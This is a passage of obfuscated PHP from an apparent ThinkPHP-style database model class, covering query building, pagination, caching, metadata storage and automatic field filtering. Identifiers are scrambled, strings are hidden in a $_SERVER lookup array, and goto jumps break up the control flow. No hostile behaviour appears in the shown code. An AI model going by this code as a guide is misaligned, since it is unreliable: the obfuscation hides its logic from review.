$d›«ä¶‘¸) { if (!empty($d›«ä¶‘¸) && is_string($d›«ä¶‘¸) && !1 === strpos($d›«ä¶‘¸, $c”ˆŞñ³Ñ[18])) { $d›«ä¶‘¸ = think_config($d›«ä¶‘¸); } $EìŞ´„„Ÿ¶[$fä¡óÑõ›ê] = Db::getInstance($d›«ä¶‘¸); } elseif (NULL === $d›«ä¶‘¸) { $EìŞ´„„Ÿ¶[$fä¡óÑõ›ê]->close(); unset($EìŞ´„„Ÿ¶[$fä¡óÑõ›ê]); return; } if (!empty($bòàŠ•ø)) { if (is_string($bòàŠ•ø)) { parse_str($bòàŠ•ø, $bòàŠ•ø); } foreach ($bòàŠ•ø as $D‚ƒ¹ŞÇ‹œ => $BÁƒ‹šÎ‚) { $this->setProperty($D‚ƒ¹ŞÇ‹œ, $BÁƒ‹šÎ‚); } } goto DÂïÊÄ´‹; DÂïÊÄ´‹: $B•æˆ«ƒ¿ [$fä¡óÑõ›ê] = $d›«ä¶‘¸; $this->db = $EìŞ´„„Ÿ¶[$fä¡óÑõ›ê]; $this->_after_db(); goto CáÍßƒŠº; b¬£¤¯ç‡: $c”ˆŞñ³Ñ =& $_SERVER[¾÷]; if ($c”ˆŞñ³Ñ[43] === $fä¡óÑõ›ê && $this->db) { return $this->db; } static $B•æˆ«ƒ¿  = array(); goto DŠ©µÖÄ´; CáÍßƒŠº: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto B«”ÊŒƒœÄ; B«”ÊŒƒœÄ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $D†ºóÀÁİ = get_class($this); if ($D†ºóÀÁİ == $_SERVER[¾÷][351]) { return $this->name; } $this->name = substr($D†ºóÀÁİ, 0, -5); } return $this->name; } public function getTableName() { $E…ŸßˆŒæ =& $_SERVER[¾÷]; if (empty($this->trueTableName)) { $fÆèã—˜î´ = !empty($this->tablePrefix) ? $this->tablePrefix : $E…ŸßˆŒæ[43]; if (!empty($this->tableName)) { $fÆèã—˜î´ .= $this->tableName; } else { $fÆèã—˜î´ .= think_parse_name($this->name); } $this->trueTableName = strtolower($fÆèã—˜î´); } return (!empty($this->dbName) ? $this->dbName . $E…ŸßˆŒæ[104] : $E…ŸßˆŒæ[43]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $dªŒ±õ‡»Û =& $_SERVER[¾÷]; return isset($this->fields[$dªŒ±õ‡»Û[256]]) ? $this->fields[$dªŒ±õ‡»Û[256]] : $this->pk; } public function getDbFields() { $C ÈšŒÖ» =& $_SERVER[¾÷]; if (isset($this->options[$C ÈšŒÖ»[284]])) { $dÔíÔò–ç« = $this->db->getFields($this->options[$C ÈšŒÖ»[284]]); return $dÔíÔò–ç« ? array_keys($dÔíÔò–ç«) : !1; } if ($this->fields) { $dÔíÔò–ç« = $this->fields; unset($dÔíÔò–ç«[$C ÈšŒÖ»[255]], $dÔíÔò–ç«[$C ÈšŒÖ»[256]], $dÔíÔò–ç«[$C ÈšŒÖ»[257]], $dÔíÔò–ç«[$C ÈšŒÖ»[254]]); return $dÔíÔò–ç«; } return !1; } public function data($Aì÷‘ùõÙÏ = '') { $E Õ–ñÄˆ =& $_SERVER[¾÷]; if ($E Õ–ñÄˆ[43] === $Aì÷‘ùõÙÏ && !empty($this->data)) { return $this->data; } if (is_object($Aì÷‘ùõÙÏ)) { $Aì÷‘ùõÙÏ = get_object_vars($Aì÷‘ùõÙÏ); } elseif (is_string($Aì÷‘ùõÙÏ)) { parse_str($Aì÷‘ùõÙÏ, $Aì÷‘ùõÙÏ); } elseif (!is_array($Aì÷‘ùõÙÏ)) { think_exception(think_lang($E Õ–ñÄˆ[276])); } $this->data = $Aì÷‘ùõÙÏ; return $this; } public function join($F•¤¶· â) { $fò«Éğ§ÍÙ =& $_SERVER[¾÷]; if (is_array($F•¤¶· â)) { $this->options[$fò«Éğ§ÍÙ[287]] = $F•¤¶· â; } elseif (!empty($F•¤¶· â)) { $this->options[$fò«Éğ§ÍÙ[287]][] = $F•¤¶· â; } return $this; } public function union($BæÄ¶¯‘î‡, $a×Œ–¯Ùî‹ = false) { goto BÎÚŞµ½ùÂ; BÎÚŞµ½ùÂ: $aßèŒ¡…ßŞ =& $_SERVER[¾÷]; if (empty($BæÄ¶¯‘î‡)) { return $this; } if ($a×Œ–¯Ùî‹) { $this->options[$aßèŒ¡…ßŞ[352]][$aßèŒ¡…ßŞ[353]] = !0; } goto d¸†™èšàö; d¸†™èšàö: if (is_object($BæÄ¶¯‘î‡)) { $BæÄ¶¯‘î‡ = get_object_vars($BæÄ¶¯‘î‡); } if (is_string($BæÄ¶¯‘î‡)) { $FÀæÉæÈìø = $BæÄ¶¯‘î‡; } elseif (is_array($BæÄ¶¯‘î‡)) { if (isset($BæÄ¶¯‘î‡[0])) { $this->options[$aßèŒ¡…ßŞ[352]] = array_merge($this->options[$aßèŒ¡…ßŞ[352]], $BæÄ¶¯‘î‡); return $this; } else { $FÀæÉæÈìø = $BæÄ¶¯‘î‡; } } else { think_exception(think_lang($aßèŒ¡…ßŞ[276])); } $this->options[$aßèŒ¡…ßŞ[352]][] = $FÀæÉæÈìø; goto D¿°Ùº„µ; D¿°Ùº„µ: return $this; goto f°°ÕÕó²¡; f°°ÕÕó²¡: } public function cache($B­ÂÅÍË = true, $A‘íÕìØ = null, $DÎÚ¯Ç£ = '') { $bô—‰ÆçŠ† =& $_SERVER[¾÷]; if (!1 !== $B­ÂÅÍË) { $this->options[$bô—‰ÆçŠ†[354]] = array($bô—‰ÆçŠ†[102] => $B­ÂÅÍË, $bô—‰ÆçŠ†[344] => $A‘íÕìØ, $bô—‰ÆçŠ†[39] => $DÎÚ¯Ç£); } return $this; } public function field($a¦Çë«¤ï¾, $Fô²ìŒÏ©é = false) { $Dâ¶ªîª±¿ =& $_SERVER[¾÷]; if (!0 === $a¦Çë«¤ï¾) { $FÔ¥ƒùŠ = $this->getDbFields(); $a¦Çë«¤ï¾ = $FÔ¥ƒùŠ ? $FÔ¥ƒùŠ : $Dâ¶ªîª±¿[191]; } elseif ($Fô²ìŒÏ©é) { if (is_string($a¦Çë«¤ï¾)) { $a¦Çë«¤ï¾ = explode($Dâ¶ªîª±¿[57], $a¦Çë«¤ï¾); } $FÔ¥ƒùŠ = $this->getDbFields(); $a¦Çë«¤ï¾ = $FÔ¥ƒùŠ ? array_diff($FÔ¥ƒùŠ, $a¦Çë«¤ï¾) : $a¦Çë«¤ï¾; } $this->options[$Dâ¶ªîª±¿[278]] = $a¦Çë«¤ï¾; return $this; } public function scope($e·ÑÅ²ÙÖ© = '', $FÜİğİÎŞ¾ = NULL) { $b‡æ …Á‘ñ =& $_SERVER[¾÷]; if ($b‡æ …Á‘ñ[43] === $e·ÑÅ²ÙÖ©) { if (isset($this->_scope[$b‡æ …Á‘ñ[44]])) { $f®‹êÇ÷å = $this->_scope[$b‡æ …Á‘ñ[44]]; } else { return $this; } } elseif (is_string($e·ÑÅ²ÙÖ©)) { $Eì¿ğĞÌ†Ù = explode($b‡æ …Á‘ñ[57], $e·ÑÅ²ÙÖ©); $f®‹êÇ÷å = array(); foreach ($Eì¿ğĞÌ†Ù as $A‡„Š·¡»¸) { if (!isset($this->_scope[$A‡„Š·¡»¸])) { continue; } $f®‹êÇ÷å = array_merge($f®‹êÇ÷å, $this->_scope[$A‡„Š·¡»¸]); } if (!empty($FÜİğİÎŞ¾) && is_array($FÜİğİÎŞ¾)) { $f®‹êÇ÷å = array_merge($f®‹êÇ÷å, $FÜİğİÎŞ¾); } } elseif (is_array($e·ÑÅ²ÙÖ©)) { $f®‹êÇ÷å = $e·ÑÅ²ÙÖ©; } if (is_array($f®‹êÇ÷å) && !empty($f®‹êÇ÷å)) { $this->options = array_merge($this->options, array_change_key_case($f®‹êÇ÷å)); } return $this; } public function where($e–×‚¢í±İ, $dâÌİâ—‘Š = null) { $DŒ±›ë¶Š =& $_SERVER[¾÷]; if (!is_null($dâÌİâ—‘Š) && is_string($e–×‚¢í±İ)) { if (!is_array($dâÌİâ—‘Š)) { $dâÌİâ—‘Š = func_get_args(); array_shift($dâÌİâ—‘Š); } $dâÌİâ—‘Š = array_map(array($this->db, $DŒ±›ë¶Š[348]), $dâÌİâ—‘Š); $e–×‚¢í±İ = vsprintf($e–×‚¢í±İ, $dâÌİâ—‘Š); } elseif (is_object($e–×‚¢í±İ)) { $e–×‚¢í±İ = get_object_vars($e–×‚¢í±İ); } elseif (is_array($e–×‚¢í±İ)) { foreach ($e–×‚¢í±İ as $Ağ¾Ú›š×— => $B¦¾â‡ˆÃ) { if ((is_numeric($Ağ¾Ú›š×—) || !$Ağ¾Ú›š×—) && is_string($B¦¾â‡ˆÃ)) { if (strpos($B¦¾â‡ˆÃ, $DŒ±›ë¶Š[355]) === 0) { continue; } think_trace($DŒ±›ë¶Š[356], $DŒ±›ë¶Š[43], $DŒ±›ë¶Š[56]); die; } } } if (is_string($e–×‚¢í±İ) && $DŒ±›ë¶Š[43] != $e–×‚¢í±İ) { $E‰ÒİšÃµ¦ = array(); $E‰ÒİšÃµ¦[$DŒ±›ë¶Š[357]] = $e–×‚¢í±İ; $e–×‚¢í±İ = $E‰ÒİšÃµ¦; } if (isset($this->options[$DŒ±›ë¶Š[280]])) { $this->options[$DŒ±›ë¶Š[280]] = array_merge($this->options[$DŒ±›ë¶Š[280]], $e–×‚¢í±İ); } else { $this->options[$DŒ±›ë¶Š[280]] = $e–×‚¢í±İ; } return $this; } public function limit($d¸Â¡Úœçì, $fƒ­àíÅµ’ = null) { $b›åŒ‘Ç”— =& $_SERVER[¾÷]; $this->options[$b›åŒ‘Ç”—[297]] = is_null($fƒ­àíÅµ’) ? $d¸Â¡Úœçì : $d¸Â¡Úœçì . $b›åŒ‘Ç”—[57] . $fƒ­àíÅµ’; return $this; } public function page($a¼ÆÈ™æ‰, $E¶©ÒÑ™ì› = null) { $F¶‹‡”ë‚À =& $_SERVER[¾÷]; $this->options[$F¶‹‡”ë‚À[358]] = is_null($E¶©ÒÑ™ì›) ? $a¼ÆÈ™æ‰ : $a¼ÆÈ™æ‰ . $F¶‹‡”ë‚À[57] . $E¶©ÒÑ™ì›; return $this; } public function comment($FÚêÊÃ˜Çİ) { $this->options[$_SERVER[¾÷][359]] = $FÚêÊÃ˜Çİ; return $this; } public function setProperty($Fôñ§¶êî, $eó‡ø–Æõ) { if (property_exists($this, $Fôñ§¶êî)) { $this->{$Fôñ§¶êî} = $eó‡ø–Æõ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\146\171\124\x69\x6d\145", "\164\x69\x6d\x65", "\151\x6e\163\145\162\x74\54\x75\x70\144\x61\164\145", "\x66\165\x6e\143\164\x69\157\156"), array("\143\x72\145\x61\164\x65\124\x69\155\x65", "\164\151\x6d\145", "\151\156\x73\x65\162\164", "\x66\165\x6e\x63\x74\x69\x6f\x6e")); public function setDataAuto($fì§Æç¬°‡) { $this->dataAuto = $fì§Æç¬°‡; } public function __construct($a‘Êªëõé“ = '', $Dè¤Úß¹±Â = '', $b³…Š¾ÕŒä = '') { parent::__construct($a‘Êªëõé“, $Dè¤Úß¹±Â, $b³…Š¾ÕŒä); } public static function textEncode($F®ÁŠ¸öªà) { if (!$F®ÁŠ¸öªà) { return $F®ÁŠ¸öªà; } $DœøàÒª»— = json_encode($F®ÁŠ¸öªà); $DœøàÒª»— = preg_replace_callback($_SERVER[¾÷][360], function ($f«ÜŒ¥ß©¸) { return addslashes($f«ÜŒ¥ß©¸[0]); }, $DœøàÒª»—); return json_decode($DœøàÒª»—); } public static function textDecode($CéÑÕ¶ÔØ¡) { $b­öëš’ÈŞ =& $_SERVER[¾÷]; $cä‡©Åó©• = json_encode($CéÑÕ¶ÔØ¡); $cä‡©Åó©• = preg_replace_callback($b­öëš’ÈŞ[361], function ($C¸ÉÊÔƒ¦) { return $_SERVER[¾÷][106]; }, $cä‡©Åó©•); return json_decode($cä‡©Åó©•); } protected $tableMeta = array(); protected function _beforeInsert(&$dò”ó³Ä“Â, $fïÈ»ˆ°å¦) { $aœ¡–¬É•ù =& $_SERVER[¾÷]; if (!$this->checkDataAutoHas($aœ¡–¬É•ù[362])) { return; } $this->dataBeforeFilter($dò”ó³Ä“Â, $aœ¡–¬É•ù[362]); } protected function _beforeUpdate(&$e‘ª¡·‰ÀŠ, $Fåë¯Š•ç¹) { $Dø£¿Óâ¥ñ =& $_SERVER[¾÷]; if (!$this->checkDataAutoHas($Dø£¿Óâ¥ñ[363])) { return; } $this->dataBeforeFilter($e‘ª¡·‰ÀŠ, $Dø£¿Óâ¥ñ[363]); } protected function _afterSelect(&$aˆäŠêÇ’Ö, $e„«¦Ÿ»ÆĞ) { if (!is_array($aˆäŠêÇ’Ö)) { return; } if (!$this->checkDataAutoHas($_SERVER[¾÷][364])) { return; } foreach ($aˆäŠêÇ’Ö as &$B†­È“ÇÏÈ) { $this->dataAfterFilter($B†­È“ÇÏÈ); } unset($B†­È“ÇÏÈ); } protected function _afterFind(&$eË…¡±òò„, $f¹Ø•¥Î¡¢) { if (!is_array($eË…¡±òò„)) { return; } if (!$this->checkDataAutoHas($_SERVER[¾÷][364])) { return; } $this->dataAfterFilter($eË…¡±òò„); } public function setAutoIncrement($fã½œê‹Üè) { $E¸¤¸°â = array($this->getPk() => $fã½œê‹Üè); $c†éŠù¢¥ã = $this->data($E¸¤¸°â)->add(); if ($c†éŠù¢¥ã) { $this->delete($c†éŠù¢¥ã); } } public function getAutoIncrement() { $aù¢÷º¯¼ = $this->getTableName(); $d·›‰ªÙ… = $this->max($this->getPk()); $D™à»‡©¸” = $this->query("\163\x68\x6f\x77\40\x74\x61\x62\154\145\40\163\x74\141\x74\165\x73\40\x77\x68\145\x72\145\x20\116\141\155\145\x3d\x27{$aù¢÷º¯¼}\x27"); $e¥ƒóŠÕ® = $D™à»‡©¸”[0][$_SERVER[¾÷][365]]; $b’ÊŠ¥®¸– = max($d·›‰ªÙ…, $e¥ƒóŠÕ®); return $b’ÊŠ¥®¸–; } protected function _callBefore($fò×ÍáñÏ, $C©éù×±¦) { return $this->cacheCallCheck($fò×ÍáñÏ, $C©éù×±¦, !1); } protected function _callAfter($c›öÀÚîÏ½, $BàÚÄà´ò) { return $this->cacheCallCheck($c›öÀÚîÏ½, $BàÚÄà´ò, !0); } protected function cacheFunctionAlias($c°™Ğäî´³) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($BÉ°¹ˆù±Ä, $D´¡Ô«õç, $Eƒğˆ¾¦Ãœ = false) { $f­ï¶“ÊÄ = $this->cacheFunctionAlias($D´¡Ô«õç); if (!$f­ï¶“ÊÄ) { return; } foreach ($f­ï¶“ÊÄ as $aºò¤É¦ÃŸ => $c‚ñ¢Ü»ô„) { $AË«ŠîÕ¨ = $c‚ñ¢Ü»ô„[0]; $d•®ß²¢Ë… = explode($_SERVER[¾÷][57], $c‚ñ¢Ü»ô„[1]); if ($BÉ°¹ˆù±Ä == $aºò¤É¦ÃŸ) { return $this->cacheFunctionGet($aºò¤É¦ÃŸ, $AË«ŠîÕ¨); } if ($Eƒğˆ¾¦Ãœ && in_array($BÉ°¹ˆù±Ä, $d•®ß²¢Ë…)) { $this->cacheFunctionClear($aºò¤É¦ÃŸ, $AË«ŠîÕ¨); } } } public function cacheFunctionGet($f‚å×’Ïµ¿, $E±Ü†Ï™Ì) { $b¹ƒ˜’‚Û¦ = $this->cacheKeyMake($f‚å×’Ïµ¿, $E±Ü†Ï™Ì); $f¬ª²éò‘ = Cache::get($b¹ƒ˜’‚Û¦); if (!is_array($f¬ª²éò‘)) { $f¬ª²éò‘ = call_user_func_array(array($this, $f‚å×’Ïµ¿), array($E±Ü†Ï™Ì, !0)); Cache::set($b¹ƒ˜’‚Û¦, $f¬ª²éò‘); } return $f¬ª²éò‘; } public function cacheFunctionClear($ešÉå¼ÇŠ, $CÅŒÚ¿Ü) { $C¾›‚ö„‹ = $CÅŒÚ¿Ü; if (!is_array($CÅŒÚ¿Ü)) { $C¾›‚ö„‹ = array($CÅŒÚ¿Ü); } foreach ($C¾›‚ö„‹ as $b¸Ü’öŞ·) { $FØ”¼² = $this->cacheKeyMake($ešÉå¼ÇŠ, $b¸Ü’öŞ·); Cache::remove($FØ”¼²); } } private function cacheKeyMake($bŠòˆç°ÈŒ, $e¡Ş¤¨ÈÀ–) { $EÍêŠÓøè =& $_SERVER[¾÷]; return get_class($this) . $EÍêŠÓøè[80] . $bŠòˆç°ÈŒ . $EÍêŠÓøè[366] . $e¡Ş¤¨ÈÀ–; } protected function selectPageReset() { $C‚ì˜³Éô =& $_SERVER[¾÷]; if (isset($GLOBALS[$C‚ì˜³Éô[367]])) { return; } $GLOBALS[$C‚ì˜³Éô[367]] = isset($GLOBALS[$C‚ì˜³Éô[17]][$C‚ì˜³Éô[368]]) ? $GLOBALS[$C‚ì˜³Éô[17]][$C‚ì˜³Éô[368]] : !1; $GLOBALS[$C‚ì˜³Éô[369]] = isset($GLOBALS[$C‚ì˜³Éô[17]][$C‚ì˜³Éô[358]]) ? $GLOBALS[$C‚ì˜³Éô[17]][$C‚ì˜³Éô[358]] : !1; $GLOBALS[$C‚ì˜³Éô[17]][$C‚ì˜³Éô[368]] = !1; $GLOBALS[$C‚ì˜³Éô[17]][$C‚ì˜³Éô[358]] = !1; } protected function selectPageRestore() { $BÌÕèÚ =& $_SERVER[¾÷]; if (!isset($GLOBALS[$BÌÕèÚ[367]])) { return; } $GLOBALS[$BÌÕèÚ[17]][$BÌÕèÚ[368]] = $GLOBALS[$BÌÕèÚ[367]]; $GLOBALS[$BÌÕèÚ[17]][$BÌÕèÚ[358]] = $GLOBALS[$BÌÕèÚ[369]]; unset($GLOBALS[$BÌÕèÚ[367]]); unset($GLOBALS[$BÌÕèÚ[369]]); } protected function selectPage($a˜Ş„ĞÁß = 200, $bæ˜ÒÄÎóª = 1) { goto f”æù¼ÑÎÃ; fˆƒ¢¢„‰ª: $dŒáíºÃõè = $B¼›¾éù˜; $dŒáíºÃõè[$böãˆÒß„È[370]] = array(); $a˜Ş„ĞÁß = intval($a˜Ş„ĞÁß); goto a  ­–Ñ‘ğ; BŞ®ˆ¶ªœø: $cØ÷Æ¦¸‚† = 50000; $a˜Ş„ĞÁß = isset($in[$böãˆÒß„È[368]]) && $in[$böãˆÒß„È[368]] ? $in[$böãˆÒß„È[368]] : $a˜Ş„ĞÁß; if ($a˜Ş„ĞÁß === -1) { $in[$böãˆÒß„È[368]] = !1; $cØ÷Æ¦¸‚† = 100000000; $a˜Ş„ĞÁß = $cØ÷Æ¦¸‚†; } goto fˆƒ¢¢„‰ª; f”æù¼ÑÎÃ: $böãˆÒß„È =& $_SERVER[¾÷]; global $in; $B¼›¾éù˜ = $this->optionsValue(); goto BŞ®ˆ¶ªœø; D”Í‡ä˜ÈÛ: return $a•ç’‰ÀõÊ; goto EÅˆàŸ¥Ş; a  ­–Ñ‘ğ: $a˜Ş„ĞÁß = $a˜Ş„ĞÁß <= 5 ? 5 : ($a˜Ş„ĞÁß >= $cØ÷Æ¦¸‚† ? $cØ÷Æ¦¸‚† : $a˜Ş„ĞÁß); $bæ˜ÒÄÎóª = intval(isset($in[$böãˆÒß„È[358]]) && $in[$böãˆÒß„È[358]] ? $in[$böãˆÒß„È[358]] : $bæ˜ÒÄÎóª); $bæ˜ÒÄÎóª = $bæ˜ÒÄÎóª <= 1 ? 1 : $bæ˜ÒÄÎóª; goto D÷ãÓ‹¯¬È; D÷ãÓ‹¯¬È: $B¾Ùèòíéå = array(); $A‘´ĞÄ¢ˆ¤ = 1; if ($bæ˜ÒÄÎóª == 1 && $A‘´ĞÄ¢ˆ¤) { $this->optionsValue($B¼›¾éù˜); $B¾Ùèòíéå = $this->page($bæ˜ÒÄÎóª, $a˜Ş„ĞÁß)->select(); $D°“çØ„Ù½ = is_array($B¾Ùèòíéå) ? count($B¾Ùèòíéå) : 0; if ($D°“çØ„Ù½ < $a˜Ş„ĞÁß) { $F¿îÑˆ“ = 1; } else { $this->optionsValue($dŒáíºÃõè); $D°“çØ„Ù½ = intval($this->count()); $F¿îÑˆ“ = ceil($D°“çØ„Ù½ / $a˜Ş„ĞÁß); } } else { $this->optionsValue($dŒáíºÃõè); $D°“çØ„Ù½ = intval($this->count()); $F¿îÑˆ“ = ceil($D°“çØ„Ù½ / $a˜Ş„ĞÁß); $bæ˜ÒÄÎóª = $bæ˜ÒÄÎóª >= $F¿îÑˆ“ ? $F¿îÑˆ“ : $bæ˜ÒÄÎóª; $this->optionsValue($B¼›¾éù˜); $B¾Ùèòíéå = $this->page($bæ˜ÒÄÎóª, $a˜Ş„ĞÁß)->select(); } goto d Äîõ¶‚§; d Äîõ¶‚§: if (!is_array($B¾Ùèòíéå)) { $B¾Ùèòíéå = array(); } if ($F¿îÑˆ“ == 1) { $D°“çØ„Ù½ = count($B¾Ùèòíéå); } $a•ç’‰ÀõÊ = array($böãˆÒß„È[371] => array($böãˆÒß„È[372] => $D°“çØ„Ù½, $böãˆÒß„È[368] => $a˜Ş„ĞÁß, $böãˆÒß„È[358] => $bæ˜ÒÄÎóª, $böãˆÒß„È[373] => $F¿îÑˆ“), $böãˆÒß„È[374] => $B¾Ùèòíéå); goto D”Í‡ä˜ÈÛ; EÅˆàŸ¥Ş: } protected function checkLength($eõŸÕãÆ‹®, $a¸ŞÀ˜ä˜ = 0, $E ‘ÏÄÓÂï = '') { $cáìö…™äø =& $_SERVER[¾÷]; $a¸ŞÀ˜ä˜ = $a¸ŞÀ˜ä˜ ? $a¸ŞÀ˜ä˜ : 65536; if (!$eõŸÕãÆ‹® || strlen($eõŸÕãÆ‹®) < $a¸ŞÀ˜ä˜) { return; } $E ‘ÏÄÓÂï = $E ‘ÏÄÓÂï ? $E ‘ÏÄÓÂï . $cáìö…™äø[77] : $cáìö…™äø[43]; show_json($E ‘ÏÄÓÂï . LNG($cáìö…™äø[375]) . "\50{$a¸ŞÀ˜ä˜}\51", !1); } protected function metaSet($F´ó‚£‡å, $c¬ë¼¯¸œ = null, $c‘¹ –ä¦„ = null) { goto e†©ó¯ïø´; FÅÒ›õ‡‘‚: $F±²¨¸Ö´ = $AÃ³ªñçµ[380] . $this->tableMeta; CacheLock::lock($F±²¨¸Ö´); $E¡Î‡¤¿·ö->where(array($cïå‹¸‰¿’ => $F´ó‚£‡å))->addAll($BÒâÃ„‘Ò‰, array(), !0); goto cİ­¸´îë¡; c‰Î¶ŒÁ§“: if (is_null($c¬ë¼¯¸œ)) { return $E¡Î‡¤¿·ö->where(array($cïå‹¸‰¿’ => $F´ó‚£‡å))->delete(); } if (is_null($c‘¹ –ä¦„) && is_string($c¬ë¼¯¸œ)) { return $E¡Î‡¤¿·ö->where($E–²óëËË³)->delete(); } $e®Ã–‘É„ = is_array($c¬ë¼¯¸œ) ? $c¬ë¼¯¸œ : array(); goto eƒÀ´¹‹ô÷; c°Œ´Â­·º: $fƒ÷Û°÷×† = $this->tableMeta[$AÃ³ªñçµ[377]]; $E¡Î‡¤¿·ö = Model($fƒ÷Û°÷×†); $E–²óëËË³ = array($cïå‹¸‰¿’ => $F´ó‚£‡å, $AÃ³ªñçµ[378] => $c¬ë¼¯¸œ); goto c‰Î¶ŒÁ§“; e†©ó¯ïø´: $AÃ³ªñçµ =& $_SERVER[¾÷]; if (!$this->tableMeta || !$F´ó‚£‡å) { return !1; } $cïå‹¸‰¿’ = $this->tableMeta[$AÃ³ªñçµ[376]]; goto c°Œ´Â­·º; cİ­¸´îë¡: CacheLock::unlock($F±²¨¸Ö´); return !0; goto BŞì‚ĞÜ©ê; eƒÀ´¹‹ô÷: if (is_string($c¬ë¼¯¸œ)) { $e®Ã–‘É„[$c¬ë¼¯¸œ] = $c‘¹ –ä¦„; } $BÒâÃ„‘Ò‰ = array(); foreach ($e®Ã–‘É„ as $Bæ ¢ï‚¿„ => $F¯š‘Ò®âŠ) { $this->checkLength($F¯š‘Ò®âŠ, !1, $fƒ÷Û°÷×† . $AÃ³ªñçµ[14] . $Bæ ¢ï‚¿„); $BÒâÃ„‘Ò‰[] = array($cïå‹¸‰¿’ => $F´ó‚£‡å, $AÃ³ªñçµ[102] => $Bæ ¢ï‚¿„, $AÃ³ªñçµ[379] => $F¯š‘Ò®âŠ); } goto FÅÒ›õ‡‘‚; BŞì‚ĞÜ©ê: } public function metaGet($aš‘½ƒàĞœ, $cÒ¨œÛä«‚ = false) { goto A‰ÓË¶Ú; BÊÚ¦Æ¶ˆ: $aß”İ«ó„ = $C„‰¤îà÷->field($cùà‡ ùİ[381])->where($C“¨¹—¸Á)->select(); $aß”İ«ó„ = array_to_keyvalue($aß”İ«ó„, $cùà‡ ùİ[102], $cùà‡ ùİ[379]); return $aß”İ«ó„; goto e¨Ô£êáò¼; A‰ÓË¶Ú: $cùà‡ ùİ =& $_SERVER[¾÷]; if (!$this->tableMeta) { return array(); } $bà§‡Ôøµ› = $this->tableMeta[$cùà‡ ùİ[376]]; goto Eä‹£™ñÚ; Eä‹£™ñÚ: $C„‰¤îà÷ = Model($this->tableMeta[$cùà‡ ùİ[377]]); if ($cÒ¨œÛä«‚) { $C“¨¹—¸Á = array($bà§‡Ôøµ› => $aš‘½ƒàĞœ, $cùà‡ ùİ[102] => $cÒ¨œÛä«‚); return $C„‰¤îà÷->where($C“¨¹—¸Á)->getField($cùà‡ ùİ[379]); } $C“¨¹—¸Á = array($bà§‡Ôøµ› => $aš‘½ƒàĞœ); goto BÊÚ¦Æ¶ˆ; e¨Ô£êáò¼: } private function checkDataAutoHas($cãø£‘¯ó) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $e½™î´Ã›) { if (in_array($cãø£‘¯ó, explode($_SERVER[¾÷][57], $e½™î´Ã›[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$c’„§´œï, $AÅŒøÒ­Üå) { $AÆ‚Ëõİ·Ì =& $_SERVER[¾÷]; foreach ($this->dataAuto as $DË³™ñ«½æ) { $eºÆèèåˆ‰ = $DË³™ñ«½æ[0]; if (!in_array($AÅŒøÒ­Üå, explode($AÆ‚Ëõİ·Ì[57], $DË³™ñ«½æ[2]))) { continue; } switch (trim($DË³™ñ«½æ[3])) { case $AÆ‚Ëõİ·Ì[326]: case $AÆ‚Ëõİ·Ì[327]: $b¬½‹ãƒÑœ = $DË³™ñ«½æ[1]; $Bˆ›½õ­Ë = isset($DË³™ñ«½æ[4]) ? (array) $DË³™ñ«½æ[4] : array(); if ($b¬½‹ãƒÑœ == $AÆ‚Ëõİ·Ì[205] && array_key_exists($eºÆèèåˆ‰, $c’„§´œï)) { if (!$c’„§´œï[$eºÆèèåˆ‰]) { unset($c’„§´œï[$eºÆèèåˆ‰]); } break; } if (isset($c’„§´œï[$eºÆèèåˆ‰])) { array_unshift($Bˆ›½õ­Ë, $c’„§´œï[$eºÆèèåˆ‰]); } if ($AÆ‚Ëõİ·Ì[326] == $DË³™ñ«½æ[3]) { $c’„§´œï[$eºÆèèåˆ‰] = call_user_func_array($b¬½‹ãƒÑœ, $Bˆ›½õ­Ë); } else { $c’„§´œï[$eºÆèèåˆ‰] = call_user_func_array(array(&$this, $b¬½‹ãƒÑœ), $Bˆ›½õ­Ë); } break; case $AÆ‚Ëõİ·Ì[278]: $c’„§´œï[$eºÆèèåˆ‰] = $c’„§´œï[$DË³™ñ«½æ[1]]; break; case $AÆ‚Ëõİ·Ì[299]: if (isset($c’„§´œï[$eºÆèèåˆ‰]) && !is_string($c’„§´œï[$eºÆèèåˆ‰])) { $c’„§´œï[$eºÆèèåˆ‰] = json_encode_force($c’„§´œï[$eºÆèèåˆ‰]); } break; case $AÆ‚Ëõİ·Ì[328]: if ($c’„§´œï[$eºÆèèåˆ‰] === $AÆ‚Ëõİ·Ì[43]) { unset($c’„§´œï[$eºÆèèåˆ‰]); } break; case $AÆ‚Ëõİ·Ì[329]: $c’„§´œï[$eºÆèèåˆ‰] = $DË³™ñ«½æ[1]; default: break; } } if ($AÅŒøÒ­Üå == $AÆ‚Ëõİ·Ì[362]) { $C—¨Şø„ŠÑ = strtolower($this->db->getDbType()); if (strpos($C—¨Şø„ŠÑ, $AÆ‚Ëõİ·Ì[19]) !== 0) { return; } $D¶Ôæ…º‘ª = $this->field(!0)->fields; $E¨É·áßÏ = $D¶Ôæ…º‘ª[$AÆ‚Ëõİ·Ì[257]]; if (isset($D¶Ôæ…º‘ª[$AÆ‚Ëõİ·Ì[256]])) { unset($E¨É·áßÏ[$D¶Ôæ…º‘ª[$AÆ‚Ëõİ·Ì[256]]]); } foreach ($E¨É·áßÏ as $C‰‘Íä¯ => $AÅŒøÒ­Üå) { if (!isset($c’„§´œï[$C‰‘Íä¯])) { $c’„§´œï[$C‰‘Íä¯] = $AÆ‚Ëõİ·Ì[43]; } } } } private function dataAfterFilter(&$eŠš®³»´) { $eåƒòŞ÷ëˆ =& $_SERVER[¾÷]; foreach ($this->dataAuto as $EªÚ¿Š¬•) { $bÕ•ÚÍ…¶ = $EªÚ¿Š¬•[0]; if (!in_array($eåƒòŞ÷ëˆ[364], explode($eåƒòŞ÷ëˆ[57], $EªÚ¿Š¬•[2]))) { continue; } if (!isset($eŠš®³»´[$bÕ•ÚÍ…¶])) { continue; } switch (trim($EªÚ¿Š¬•[3])) { case 